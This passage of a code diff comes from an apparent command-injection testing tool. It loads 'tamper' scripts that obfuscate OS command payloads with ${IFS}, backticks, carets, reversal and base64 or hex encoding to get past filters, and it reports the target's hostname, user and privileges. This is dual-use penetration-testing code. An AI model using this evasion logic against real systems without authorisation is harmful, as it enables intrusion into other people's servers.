+Lists available tamper scripts
+"""
+def list_tamper_scripts():
+  info_msg = "Listing available tamper scripts."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+  
+  if menu.options.list_tampers:
+    message = (
+      Style.BRIGHT
+      + "Available tamper scripts:"
+      + Style.RESET_ALL
+      + "\n"
+    )
+    
+    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
+      with open(script, "rb") as script_file:
+        content = script_file.read().decode(settings.DEFAULT_CODEC)
+      match = re.search(r"About:(.*)\n", content)
+      if match:
+        comment = match.group(1).strip()
+        # Lowercase the first letter of the comment
+        comment = comment[0].lower() + comment[1:] if comment else comment
+        script_name = os.path.basename(script)
+        message += (
+          settings.SUB_CONTENT_SIGN_TYPE
+          + "Use '"
+          + Style.BRIGHT
+          + script_name
+          + Style.RESET_ALL
+          + "' that "
+          + comment
+          + "\n"
+        )
+    
+    settings.print_data_to_stdout(message.rstrip())
+    
+"""
+Shared building blocks for tamper scripts' own dependencies() checks - each script decides which
+of these apply to it, instead of a central list here trying to track every script's constraints.
+"""
+def tamper_dep_windows_only(tamper_name):
+  if settings.TARGET_OS != settings.OS.WINDOWS:
+    return "Unix-like targets do not support the usage of '" + tamper_name + ".py'. Skipping tamper script."
+
+def tamper_dep_unix_only(tamper_name):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    return "Windows targets do not support the usage of '" + tamper_name + ".py'. Skipping tamper script."
+
+def tamper_dep_eval_incompatible(tamper_name):
+  eval_in_scope = len(menu.options.tech) == 0 or "e" in menu.options.tech
+  if eval_in_scope and settings.EVAL_BASED_STATE != False:
+    return "The dynamic code evaluation technique does not support the usage of '" + tamper_name + ".py'. Skipping tamper script."
+
+def tamper_dep_time_related_only(tamper_name):
+  time_related_in_scope = len(menu.options.tech) == 0 or "t" in menu.options.tech or "f" in menu.options.tech
+  if not time_related_in_scope:
+    return "Only time-related techniques support the usage of '" + tamper_name + ".py'."
+
+def tamper_dep_alter_shell_incompatible(tamper_name):
+  if menu.options.alter_shell:
+    return "Option '--alter-shell' does not support the usage of '" + tamper_name + ".py'. Skipping tamper script."
+
+"""
+Undo a per-character obfuscation (obf_char inserted before each letter) on any whole word that settings.IGNORE_TAMPER_TRANSFORMATION says must survive intact (e.g. shell keywords like 'if'/'then').
+"""
+def tamper_restore_ignored_words(payload, obf_char):
+  for word in settings.IGNORE_TAMPER_TRANSFORMATION:
+    obf_word = obf_char.join(word[i:i+1] for i in range(-1, len(word), 1))
+    if obf_word in payload:
+      payload = payload.replace(obf_word, word)
+  return payload
+
+"""
+base64encode/hexencode consume the whole payload as one blob, so they can't coexist with
+space2plus rewriting whitespace inside it first - fatal (not a skippable warning like the rest).
+"""
+def tamper_check_space2plus_conflict(tamper_name):
+  if len(settings.WHITESPACES) != 0 and settings.WHITESPACES[0] == _urllib.parse.quote_plus(settings.SINGLE_WHITESPACE):
+    err_msg = "Tamper script '" + tamper_name + "' is unlikely to work when combined with the tamper script 'space2plus'."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+
+"""
+Tamper script checker
+"""
+def tamper_scripts(stored_tamper_scripts):
+  if menu.options.tamper:
+    # Check the provided tamper script(s)
+    available_scripts = []
+    # Drop empty segments (trailing/double comma) and de-duplicate (preserving order) so a repeated name is validated, loaded, and reported only once.
+    raw_scripts = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower())
+    provided_scripts = list(dict.fromkeys(script.strip() for script in raw_scripts if script.strip()))
+    for script in sorted(glob(os.path.join(settings.TAMPER_SCRIPTS_PATH, "*.py"))):
+      available_scripts.append(os.path.basename(script.split(".py")[0]))
+    for script in provided_scripts:
+      if script in available_scripts:
+        pass
+      else:
+        err_msg = "The '" + script + "' tamper script does not exist. "
+        err_msg += "Use the '--list-tampers' option for listing available tamper scripts."
+        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+        raise SystemExit()
+    if not stored_tamper_scripts:
+      info_msg = "Loaded tamper script" + ('s', '')[len(provided_scripts) == 1] + ": "
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+    priorities = {}
+    for script in provided_scripts:
+      # Register each script once; duplicate entries would apply the same tamper twice.
+      if script not in settings.MULTI_ENCODED_PAYLOAD:
+        settings.MULTI_ENCODED_PAYLOAD.append(script)
+      if not stored_tamper_scripts:
+        settings.print_data_to_stdout(settings.SUB_CONTENT_SIGN + script)
+      try:
+        module = importlib.import_module("src.core.tamper." + script)
+      except (ImportError, ValueError):
+        continue
+      if not hasattr(module, "__tamper__"):
+        err_msg = "Missing variable '__tamper__' "
+        err_msg += "in tamper script '" + script + "'."
+        settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+        raise SystemExit()
+      priorities[script] = getattr(module, "__priority__", settings.PRIORITY.NORMAL)
+      # Each script declares its own incompatibilities via dependencies() (e.g. OS, active
+      # technique, other options) instead of a central list here having to track them all.
+      warn_msg = module.dependencies() if hasattr(module, "dependencies") else None
+      if warn_msg:
+        # Always warn and drop incompatible scripts, including resumed techniques.
+        settings.print_once(warn_msg)
+        if script in settings.MULTI_ENCODED_PAYLOAD:
+          settings.MULTI_ENCODED_PAYLOAD.remove(script)
+
+    # Respect each tamper script's declared execution tier; offer to auto-sort conflicting --tamper order.
+    current_order = [script for script in settings.MULTI_ENCODED_PAYLOAD if script in priorities]
+    sorted_order = sorted(current_order, key=lambda script: -priorities[script])
+    if current_order != sorted_order:
+      warn_msg = "It appears that you have mixed the order of the provided tamper scripts. "
+      warn_msg += "Do you want to auto resolve this? [Y/n] "
+      if common.read_input(warn_msg, default="Y", check_batch=True).lower() != "n":
+        settings.MULTI_ENCODED_PAYLOAD = sorted_order + [script for script in settings.MULTI_ENCODED_PAYLOAD if script not in priorities]
+
+    # Using too many tamper scripts is usually not a good idea. :P
+    _ = False
+    if len(provided_scripts) >= 3 and not settings.LOAD_SESSION:
+      warn_msg = "Using too many tamper scripts "
+      _ = True
+    elif len([x for x in provided_scripts if any(y in x for y in ["nested", "doublequotes"])]) == 2 and not settings.LOAD_SESSION:
+      _ = True
+      warn_msg = "The combination of the provided tamper scripts "
+    if _:
+      warn_msg += "is not a good idea (may cause false positive / negative results)."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Check for modified whitespaces.
+"""
+def whitespace_check(payload):
+
+  _ = []
+  whitespaces = ["${IFS}", "+", "%09", "%0b", "%20"]
+  for whitespace in whitespaces:
+    if whitespace in payload:
+      _.append(whitespace)
+
+  # Enable the "space2ifs" tamper script.
+  if "${IFS}" in _:
+    if not settings.TAMPER_SCRIPTS['space2ifs']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",space2ifs"
+      else:
+        menu.options.tamper = "space2ifs"
+    settings.WHITESPACES[0] = "${IFS}"
+
+  # Enable the "space2plus" tamper script.
+  elif "+" in _ and payload.count("+") >= 2:
+    if not settings.TAMPER_SCRIPTS['space2plus']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",space2plus"
+      else:
+        menu.options.tamper = "space2plus"
+    settings.WHITESPACES[0] = "+"
+
+  # Enable the "space2htab" tamper script.
+  elif "%09" in _:
+    if not settings.TAMPER_SCRIPTS['space2htab']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",space2htab"
+      else:
+        menu.options.tamper = "space2htab"
+    settings.WHITESPACES[0] = "%09"
+
+  # Enable the "space2vtab" tamper script.
+  elif "%0b" in _:
+    if not settings.TAMPER_SCRIPTS['space2vtab']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",space2vtab"
+      else:
+        menu.options.tamper = "space2vtab"
+    settings.WHITESPACES[0] = "%0b"
+
+  # Default whitespace
+  else :
+    settings.WHITESPACES[0] = "%20"
+
+  # Enable the "multiplespaces" tamper script.
+  count_spaces = payload.count(settings.WHITESPACES[0])
+  if count_spaces > 15:
+    if not settings.TAMPER_SCRIPTS['multiplespaces']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",multiplespaces"
+      else:
+        menu.options.tamper = "multiplespaces"
+      settings.WHITESPACES[0] = settings.WHITESPACES[0] * int(count_spaces / 2)
+
+"""
+Check for symbols (i.e "`", "^", "$@" etc) between the characters of the generated payloads.
+"""
+def other_symbols(payload):
+  # Implemented check to replace each character in a user-supplied OS command with a random case.
+  if payload.count("|tr \"[A-Z]\" \"[a-z]\"") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['randomcase']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",randomcase"
+      else:
+        menu.options.tamper = "randomcase"
+
+  # Check for reversed (characterwise) user-supplied operating system commands.
+  if payload.count("|rev") >= 1 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['rev']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",rev"
+      else:
+        menu.options.tamper = "rev"
+
+  # Check for (multiple) backticks (instead of "$()") for command substitution on the generated payloads.
+  if payload.count("`") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['backticks']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",backticks"
+      else:
+        menu.options.tamper = "backticks"
+    settings.USE_BACKTICKS = True
+
+  # Check for caret symbol
+  if payload.count("^") >= 10:
+    if not settings.TAMPER_SCRIPTS['caret']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",caret"
+      else:
+        menu.options.tamper = "caret"
+
+  # Check for dollar sign followed by an at-sign
+  if payload.count("$@") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['dollaratsigns']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",dollaratsigns"
+      else:
+        menu.options.tamper = "dollaratsigns"
+
+  # Check for uninitialized variable
+  if len(re.findall(r'\${.*?}', payload)) >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['uninitializedvariable']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",uninitializedvariable"
+      else:
+        menu.options.tamper = "uninitializedvariable"
+
+  # Check for environment variable value variable
+  if payload.count("${PATH%%u*}") >= 2 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['slash2env']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",slash2env"
+      else:
+        menu.options.tamper = "slash2env"
+
+"""
+Check for (multiple) added back slashes between the characters of the generated payloads.
+"""
+def check_backslashes(payload):
+  # Check for single quotes
+  if payload.count("\\") >= 15 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['backslashes']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",backslashes"
+      else:
+        menu.options.tamper = "backslashes"
+
+"""
+Check for quotes in the generated payloads.
+"""
+def check_quotes(payload):
+  # Check for double quotes around of the generated payloads.
+  if payload.endswith("\"") and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['nested']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",nested"
+      else:
+        menu.options.tamper = "nested"
+
+  # Check for (multiple) added double-quotes between the characters of the generated payloads.
+  if payload.count("\"") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['doublequotes']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",doublequotes"
+      else:
+        menu.options.tamper = "doublequotes"
+
+  # Check for (multiple) added single-quotes between the characters of the generated payloads.
+  if payload.count("''") >= 10 and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['singlequotes']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",singlequotes"
+      else:
+        menu.options.tamper = "singlequotes"
+
+"""
+Charset matches alone do not prove encoding; require a mostly printable decoded result to confirm a real encoding.
+"""
+def decoded_text_is_plausible(text):
+  if not text:
+    return False
+  printable = sum(1 for char in text if char in string.printable and char not in "\x0b\x0c")
+  return printable / len(text) >= settings.ENCODING_PLAUSIBILITY_RATIO
+
+"""
+Check for applied (hex / b64) encoders.
+"""
+def check_encoders(payload):
+  is_decoded = False
+  encoded_with = ""
+  check_value = payload
+  long_enough = len(check_value.strip()) >= settings.ENCODING_MIN_LENGTH
+
+  settings.MULTI_ENCODED_PAYLOAD = list(dict.fromkeys(settings.MULTI_ENCODED_PAYLOAD))
+  for encode_type in list(settings.MULTI_ENCODED_PAYLOAD):
+    if encode_type == 'base64encode' or encode_type == 'hexencode':
+      while True:
+        message = "Do you want to keep using the '" + encode_type + "' tamper script? [y/N] "
+        procced_option = common.read_input(message, default="N", check_batch=True)
+        if procced_option in settings.CHOICE_YES:
+          break
+        elif procced_option in settings.CHOICE_NO:
+          if settings.VERBOSITY_LEVEL != 0:
+            debug_msg = "Unloading the '" + encode_type + "' tamper script."
+            settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+          settings.MULTI_ENCODED_PAYLOAD.remove(encode_type)
+          break
+        elif procced_option in settings.CHOICE_QUIT:
+          raise SystemExit()
+        else:
+          common.invalid_option(procced_option)
+          pass
+
+  if long_enough and (len(check_value.strip()) % 4 == 0) and \
+    re.match(settings.BASE64_RECOGNITION_REGEX, check_value) and \
+    not re.match(settings.HEX_RECOGNITION_REGEX, check_value):
+      _payload = base64.b64decode(check_value)
+      try:
+        decoded_text = _payload.decode(settings.DEFAULT_CODEC)
+        if not "\\x" in decoded_text and decoded_text_is_plausible(decoded_text):
+          settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
+          decoded_payload = _payload
+          encoded_with = "base64"
+          if re.match(settings.HEX_RECOGNITION_REGEX, check_value):
+            decoded_payload, _ = hexdecode(decoded_payload)
+            if _:
+              settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
+              encoded_with = "hex"
+      except Exception:
+        pass
+
+  elif long_enough and re.match(settings.HEX_RECOGNITION_REGEX, check_value):
+    decoded_payload, _ = hexdecode(check_value)
+    if _ and decoded_text_is_plausible(decoded_payload):
+      settings.MULTI_ENCODED_PAYLOAD.append("hexencode")
+      encoded_with = "hex"
+      if (len(check_value.strip()) % 4 == 0) and \
+        re.match(settings.BASE64_RECOGNITION_REGEX, decoded_payload) and \
+        not re.match(settings.HEX_RECOGNITION_REGEX, decoded_payload):
+          _payload = base64.b64decode(check_value)
+          try:
+            decoded_text = _payload.decode(settings.DEFAULT_CODEC)
+            if not "\\x" in decoded_text and decoded_text_is_plausible(decoded_text):
+              settings.MULTI_ENCODED_PAYLOAD.append("base64encode")
+              decoded_payload = _payload
+              encoded_with = "base64"
+          except Exception:
+            pass
+  else:
+    decoded_payload = payload
+
+  if len(encoded_with) != 0:
+    is_decoded = True
+
+  if is_decoded:
+    while True:
+      message = "The value appears to already be " + encoded_with + "-encoded. "
+      message += "Do you want to load the '" + encoded_with + "encode' tamper script to keep it that way? [Y/n] "
+      procced_option = common.read_input(message, default="Y", check_batch=True)
+      if procced_option in settings.CHOICE_YES:
+        break
+      elif procced_option in settings.CHOICE_NO:
+        settings.MULTI_ENCODED_PAYLOAD.remove(encoded_with + "encode")
+        if settings.VERBOSITY_LEVEL != 0:
+          debug_msg = "Skipping load the '" + encoded_with + "encode' tamper script."
+          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
+        break
+      elif procced_option in settings.CHOICE_QUIT:
+        raise SystemExit()
+      else:
+        common.invalid_option(procced_option)
+        pass
+
+  if is_decoded and (encoded_with + "encode") in settings.MULTI_ENCODED_PAYLOAD:
+    # Keep menu.options.tamper in sync with auto-detected tampers so resumed sessions restore them.
+    tamper_name = encoded_with + "encode"
+    provided = re.split(settings.PARAMETER_SPLITTING_REGEX, menu.options.tamper.lower()) if menu.options.tamper else []
+    if tamper_name not in provided:
+      menu.options.tamper = (menu.options.tamper + "," + tamper_name) if menu.options.tamper else tamper_name
+
+  if is_decoded:
+    return _urllib.parse.quote(decoded_payload), encoded_with
+  else:
+    return payload, encoded_with
+
+"""
+Recognise the payload.
+"""
+def recognise_payload(payload):
+  if "usleep" in payload and settings.TARGET_OS != settings.OS.WINDOWS:
+    if not settings.TAMPER_SCRIPTS['sleep2usleep']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",sleep2usleep"
+      else:
+        menu.options.tamper = "sleep2usleep"
+
+  elif "timeout" in payload:
+    if not settings.TAMPER_SCRIPTS['sleep2timeout']:
+      if menu.options.tamper:
+        menu.options.tamper = menu.options.tamper + ",sleep2timeout"
+      else:
+        menu.options.tamper = "sleep2timeout"
+
+  return check_encoders(payload)
+  
+"""
+Restore stored payloads and tampers as-is when resuming a session; skip re-detection and prompts.
+"""
+def check_for_stored_tamper(payload):
+  whitespace_check(payload)
+  other_symbols(payload)
+  check_backslashes(payload)
+  check_quotes(payload)
+  tamper_scripts(stored_tamper_scripts=True)
+
+"""
+Run a tamper script's tamper(), turning an exception or a non-string return value into a clean error instead of crashing raw or corrupting the payload.
+"""
+def _apply_tamper(script_name, module, payload):
+  try:
+    result = module.tamper(payload)
+  except Exception as err:
+    err_msg = "Tamper script '" + script_name + "' raised an unhandled error (" + str(err) + ")."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+  if not isinstance(result, str):
+    err_msg = "Tamper script '" + script_name + "' returned an invalid payload type ('" + type(result).__name__ + "')."
+    settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+    raise SystemExit()
+  return result
+
+"""
+Apply tampers in dependency order across groups, preserving the user's --tamper order within each group.
+"""
+def perform_payload_modification(payload):
+  try:
+    settings.RAW_PAYLOAD = payload.replace(settings.WHITESPACES[0], settings.SINGLE_WHITESPACE)
+  except IndexError:
+    settings.RAW_PAYLOAD = payload
+
+  # tamper_scripts() already sorts scripts by declared __priority__; apply them in that order.
+  for script in list(settings.MULTI_ENCODED_PAYLOAD):
+    # "xforwardedfor" mutates request headers, not the payload string - applied directly in headers.do_check(), nothing to do here.
+    if script == 'xforwardedfor':
+      continue
+    module = importlib.import_module("src.core.tamper." + script)
+    payload = _apply_tamper(script, module, payload)
+
+  return payload
+
+"""
+Skip parameters when the provided value is empty.
+"""
+def skip_empty(empty_parameters, http_request_method):
+  warn_msg = "Skipped the " + http_request_method
+  warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
+  warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
+  warn_msg += " '" + empty_parameters + "' from testing"
+  warn_msg += " because you specified testing of only parameter(s) with non-empty value" + "s"[len(empty_parameters.split(",")) == 1:][::-1] + "."
+  settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Prints an informational message if a nested JSON structure is detected 
+and JSON parameter enumeration has not started yet.
+"""
+def nested_json_msg(data):
+  if not settings.JSON_ENUMERATION_STARTED:
+    # Detect nested structure by checking if flattening increases the number of keys
+    if len(flatten(data)) > len(data):
+      settings.JSON_ENUMERATION_STARTED = True
+      info_msg = "Enumerating parameters due to nested JSON structure."
+      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+"""
+Pretty-print data as valid JSON using 2-space indentation.
+"""
+def format_json(data):
+  nested_json_msg(data)
+  return json.dumps(data, indent=2, ensure_ascii=False)
+
+"""
+Parsing and unflattening JSON data.
+"""
+def json_data(data):
+  try:
+    data = json.loads(data, object_pairs_hook=OrderedDict)
+    data = unflatten_list(data)
+    return format_json(data)
+  except Exception:
+    return data
+
+"""
+No parameter(s) found for testing.
+"""
+def no_parameters_found():
+  err_msg = "No parameter(s) found for testing in the provided data "
+  err_msg += "(e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). "
+  if not menu.options.crawldepth:
+    err_msg += "Rerun with '--crawl=2'."
+  settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+  raise SystemExit()
+
+"""
+Check if the provided value is empty.
+"""
+def is_empty(multi_parameters, http_request_method):
+  all_empty = False
+  empty_parameters = []
+  multi_params = [s for s in multi_parameters]
+  if settings.IS_JSON:
+    try:
+      multi_params = flatten(json.loads(','.join(multi_params), object_pairs_hook=OrderedDict)) if is_JSON_check(','.join(multi_params)) else multi_params
+    except ValueError as err_msg:
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+  for empty in multi_params:
+    try:
+      if settings.IS_JSON:
+        try:
+          if len(str(multi_params[empty])) == 0 :
+            empty_parameters.append(empty)
+        except TypeError:
+          pass
+      elif settings.IS_XML:
+        if re.findall(r'>(.*)<', empty)[0] == "" or \
+           re.findall(r'>(.*)<', empty)[0] == settings.SINGLE_WHITESPACE:
+          empty_parameters.append(re.findall(r'</(.*)>', empty)[0])
+      elif len(empty.split("=")[1]) == 0:
+        empty_parameters.append(empty.split("=")[0])
+    except IndexError:
+      pass
+
+  if len(empty_parameters) == len(multi_parameters):
+    all_empty = True
+
+  empty_parameters = ", ".join(empty_parameters)
+  if len(empty_parameters) > 0:
+    if menu.options.skip_empty:
+      skip_empty(empty_parameters, http_request_method)
+      if all_empty:
+        return all_empty
+      else:
+        return False
+    else:
+      warn_msg = "The provided value" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
+      warn_msg += " for " + http_request_method
+      warn_msg += ('', ' (JSON)')[settings.IS_JSON] + ('', ' (SOAP/XML)')[settings.IS_XML]
+      warn_msg += " parameter" + "s"[len(empty_parameters.split(",")) == 1:][::-1]
+      warn_msg += " '" + empty_parameters + "'"
+      warn_msg += (' are ', ' is ')[len(empty_parameters.split(",")) == 1] + "empty. "
+      warn_msg += "Use only valid values, so " + settings.APPLICATION
+      warn_msg += " can run properly."
+      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+      return False
+
+# Check if valid SOAP/XML
+def is_XML_check(parameter):
+  try:
+    if re.search(settings.XML_RECOGNITION_REGEX, parameter):
+      return True
+  except ValueError as err_msg:
+    return False
+
+#Check if INJECT_TAG is enclosed in quotes (in json data)
+def check_quotes_json_data(data):
+  if not json.dumps(settings.INJECT_TAG) in data:
+    data = data.replace(settings.INJECT_TAG, json.dumps(settings.INJECT_TAG))
+  return data
+
+# Check if valid JSON
+def is_JSON_check(parameter):
+  try:
+    # Attempt to load the JSON string
+    json.loads(parameter.replace(settings.INJECT_TAG,""))
+    settings.IS_VALID_JSON = True
+    return settings.IS_VALID_JSON
+  except json.JSONDecodeError as err_msg:
+    # Handle JSONDecodeError and identify common issues
+    if settings.IS_JSON and not settings.IS_VALID_JSON:
+      error_str = str(err_msg)
+      if "No JSON object could be decoded" in error_str:
+          err_msg = "JSON is invalid. No valid JSON object found."
+      elif "Expecting" in error_str and any(_ in error_str for _ in ("value", "delimiter")):
+          err_msg = "JSON parsing error: " + error_str + ". Check for missing commas, colons, or improperly escaped characters."
+      elif "Expecting" in error_str and "end of data" in error_str:
+          err_msg = "JSON parsing error: " + error_str + ". Check for extra commas or missing closing brackets."
+      settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
+      raise SystemExit()
+
+
+# Process with JSON data
+def process_data(data_type, http_request_method):
+  while True:
+    info_msg = str(data_type) + " data found in " + str(http_request_method) + " body."
+    message = info_msg
+    message += " Do you want to process it? [Y/n] "
+    process = common.read_input(message, default="Y", check_batch=True)
+    if process in settings.CHOICE_YES:
+      return True
+    elif process in settings.CHOICE_NO:
+      settings.IGNORE_USER_DEFINED_POST_DATA = True
+      return False
+    elif process in settings.CHOICE_QUIT:
+      raise SystemExit()
+    else:
+      common.invalid_option(process)
+      pass
+
+"""
+Check for similarity in provided parameter name and value.
+"""
+def check_similarities(all_params):
+  if settings.IS_JSON:
+    try:
+      _ = "".join(random.sample(string.ascii_uppercase, k=6))
+      flat = flatten(json.loads(','.join(all_params), object_pairs_hook=OrderedDict))
+      modified = False
+      for param in flat:
+        if isinstance(flat[param], str):
+          if flat[param] in param:
+            flat[param] = flat[param] + settings.RANDOM_TAG
+            modified = True
+          if settings.SINGLE_WHITESPACE in flat[param]:
+            flat[param] = flat[param].replace(settings.SINGLE_WHITESPACE, _)
+            modified = True
+      # Re-dump only on a real collision (avoids corrupting nested bodies).
+      if modified:
+        all_params = [x.replace(settings.SINGLE_WHITESPACE, "").replace(_, settings.SINGLE_WHITESPACE) for x in json.dumps(flat).split(", ")]
+    except Exception:
+      pass
+  else:
+    for param in range(0, len(all_params)):
+      if settings.IS_XML:
+        if re.findall(r'>(.*)</', all_params[param]):
+          if re.findall(r'>(.*)</', all_params[param])[0] in re.findall(r'</(.*)>', all_params[param])[0]:
+            parameter_name = ''.join(re.findall(r'</(.*)>', all_params[param]))
+            parameter_value = ''.join(re.findall(r'>(.*)</', all_params[param]))
+            all_params[param] = "<" + parameter_name + ">" + parameter_value + settings.RANDOM_TAG + "</" + parameter_name + ">"
+      else:
+        if re.findall(r'(.*)=', all_params[param]) == re.findall(r'=(.*)', all_params[param]):
+          parameter_name = ''.join(re.findall(r'=(.*)', all_params[param]))
+          if parameter_name:
+            all_params[param] = parameter_name + "=" + parameter_name + settings.RANDOM_TAG
+        elif re.findall(r'=(.*)', all_params[param])[0] in re.findall(r'(.*)=', all_params[param])[0]:
+          parameter_name = ''.join(re.findall(r'(.*)=', all_params[param]))
+          parameter_value = ''.join(re.findall(r'=(.*)', all_params[param]))
+          all_params[param] = parameter_name + "=" + parameter_value + settings.RANDOM_TAG
+
+  all_params = [str(x) for x in all_params if x is not None]
+  return all_params
+
+"""
+Generate a character pool for time‑related command injection techniques
+"""
+def generate_char_pool(num_of_chars):
+  if menu.options.charset:
+    return [ord(c) for c in menu.options.charset]
+
+  if num_of_chars == 1:
+    return list(settings.CHAR_POOL_SINGLE)
+
+  return list(settings.CHAR_POOL_MULTI)
+  
+"""
+Print powershell version
+"""
+def print_ps_version(ps_version, filename, _):
+  try:
+    settings.PS_ENABLED = True
+    ps_version = "".join(str(p) for p in ps_version)
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    # Output PowerShell's version number
+    info_msg = "Powershell version: " + ps_version
+    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.
+    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+      if not menu.options.no_logging:
+        info_msg = "Powershell version: " + ps_version + settings.END_LINE.LF
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  except ValueError:
+    warn_msg = "Failed to identify the version of Powershell, "
+    warn_msg += "which means some payloads or injection techniques may fail."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    settings.PS_ENABLED = False
+    ps_check_failed()
+
+"""
+Print hostname
+"""
+def print_hostname(shell, filename, _):
+  if shell:
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    info_msg = "Hostname: " +  str(shell)
+    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.
+    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+      if not menu.options.no_logging:
+        info_msg = info_msg + settings.END_LINE.LF
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  else:
+    warn_msg = "Failed to identify the hostname."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Print current user info
+"""
+def print_current_user(cu_account, filename, _):
+  if cu_account:
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    info_msg = "Current user: " +  str(cu_account)
+    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.
+    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+      if not menu.options.no_logging:
+        info_msg = info_msg + settings.END_LINE.LF
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+  else:
+    warn_msg = "Failed to fetch the current user."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+
+"""
+Print current user privs
+"""
+def print_current_user_privs(shell, filename, _):
+  priv = "True"
+  if (settings.TARGET_OS == settings.OS.WINDOWS and not "Admin" in shell) or \
+     (settings.TARGET_OS != settings.OS.WINDOWS and shell != "0"):
+    priv = "False"
+
+  if settings.VERBOSITY_LEVEL == 0 and _:
+    settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+
+  info_msg = "Current user has elevated privileges: " +  str(priv)
+  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+  # Add infos to logs file.
+  with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
+    if not menu.options.no_logging:
+      info_msg = info_msg + settings.END_LINE.LF
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
+"""
+Print OS info
+"""
+def print_os_info(target_os, target_arch, filename, _):
+  if target_os and target_arch:
+    if settings.VERBOSITY_LEVEL == 0 and _:
+      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
+    info_msg = "Operating system: " +  str(target_os) + settings.SINGLE_WHITESPACE + str(target_arch)
+    settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+    # Add infos to logs file.
+    with open(filename, 'a', encoding=settings.DEFAULT_CODEC) as output_file:
